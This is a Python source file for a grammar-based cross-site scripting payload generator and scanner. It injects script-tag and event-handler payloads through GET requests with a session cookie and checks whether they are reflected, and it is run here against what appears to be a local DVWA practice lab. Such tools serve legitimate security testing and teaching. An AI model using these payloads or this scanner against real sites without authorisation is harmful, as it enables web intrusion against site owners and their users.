from a import simple_grammar_fuzzer
from connect import connect
class xssPayload:

    def __init__(self):
        self.payloads = set()
        self.detect = "111111111111111"
    
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])


    # payload formmat: "><script>alert(1)</script>
    def generator_xss_1(self):
        XSS_PAYLOAD1 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@specialCharacter@<script>@command@</script>"],
            "@quote@" : ["\"", "'"],
            "@specialCharacter@" : [">"],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD1)

    
    def generator_xss_4(self):
        XSS_PAYLOAD4 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@tag@@src@@space@@event@@quote@@command@@quote@@endtag@"],
            "@tag@" : ["<a ", "<img ", "<iframe ", "<div "],
            "@src@" : ["src=hihi ", "href=hihi "],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@endtag@" : [">"],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD4)

    #payload format: " onload="javascript:alert(1)"
    def generator_xss_2(self):
        XSS_PAYLOAD2 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@space@@event@@command@@quote@"],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD2 )

    #payload include global variable like: self, ...
    def generator_xss_3(self):
        XSS_PAYLOAD3 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@global@[@command@](@value@)"],
            "@global@" : ["self"],
            "@command@" : ["alert", "prompt"],
            "@value@" : ["111111111111111"]
        
        }
        return self.generator(XSS_PAYLOAD3)

    def generator_xss(self):
        pass
    

    def scan(self, url, cookie): #link, method):
        import random
        from bs4 import BeautifulSoup as bs
        conn = connect()
        self.payloads.update(self.generator_xss_1())
        self.payloads.update(self.generator_xss_4())
        self.payloads.update(self.generator_xss_3())
        self.payloads.update(self.generator_xss_2())
        payloads = list(self.payloads)
        listPayload = []
        j = random.randrange(0, len(payloads))
        for i in payloads:
            if j == 0:
                break 
            # get ramdomly payload from list payload
            if i not in listPayload:
                listPayload.append(payloads[j])

                #source = conn.normal_POST(url, params="text", payload="\"><script>alert(1)</script>")
                # give up post method, because xss via post method not damage much to web site. 
                source = conn.render_GET(url,payloads[j], cookie)

                source.html.render(timeout=1000)# render javascript
                print(payloads[j])
                if payloads[j] in str(source.content):
                    print("Co loi")          #--------------------> Có lỗi
                    return True

            j = j - 1
        return False
            

a = xssPayload()
cookie = {"PHPSESSID" : "ompkj7fig765mo70k3kvfb1mh2", "security": "low"} 
print(a.scan("http://192.168.1.125/dvwa/vulnerabilities/xss_r/?name=aa#", cookie) )